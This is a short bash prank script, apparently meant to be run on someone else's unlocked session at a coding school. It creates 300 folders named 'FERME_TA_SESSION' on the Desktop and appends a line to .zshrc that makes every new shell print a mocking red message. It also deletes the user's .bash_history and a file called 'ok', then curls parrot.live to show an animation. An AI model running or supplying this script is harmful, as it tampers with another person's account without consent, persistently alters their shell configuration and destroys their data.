#!/bin/bash

cd $HOME/Desktop
nbr=0
while ((nbr != 300))
	do
		mkdir "FERME_TA_SESSION$nbr"
		((nbr += 1))
	done
cd ./..
echo -e "echo -e '\033[31mjbonniva est un gentil tuteur! MAINTENANT JE FERMERAI MA SESSION!\033[00m'" >> .zshrc
rm -rf .bash_history
rm -rf ok
clear
curl parrot.live